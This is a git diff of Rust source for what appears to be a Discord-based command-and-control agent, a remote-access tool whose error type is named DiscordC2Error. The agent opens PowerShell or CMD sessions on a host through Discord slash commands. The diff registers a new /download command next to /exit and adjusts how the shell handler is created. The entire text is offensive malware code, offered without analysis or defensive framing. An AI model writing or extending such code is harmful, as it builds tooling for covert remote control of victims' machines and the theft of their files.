@@ -12,6 +12,7 @@ use serenity::{
     client::Context,
 };
 use chrono::Utc;
+use crate::commands::sessions::download;
 
 /// Registers the "session" application command with the provided `CreateApplicationCommand` builder. This command
 /// allows users to open an interactive command session with the agent, using either PowerShell or CMD.
@@ -115,15 +116,16 @@ pub async fn run(ctx: &Context, options: &[CommandDataOption]) -> Result<(String
     );
 
     Command::create_global_application_command(&ctx.http, exit::register).await?; // Create the /exit command
+    Command::create_global_application_command(&ctx.http, download::register).await?;
 
     if let CommandDataOptionValue::String(shell_type) = option {
         let (content, shell) = match shell_type.as_str() {
             "powershell" => {
-                ProcessHandler::instance(ShellType::Powershell).await?;
+                ProcessHandler::instance(&ShellType::Powershell).await?;
                 (string, ShellType::Powershell)
             }
             "cmd" => {
-                ProcessHandler::instance(ShellType::Cmd).await?;
+                ProcessHandler::instance(&ShellType::Cmd).await?;
                 (string, ShellType::Cmd)
             }
             _ => return Err(DiscordC2Error::InvalidShellType)
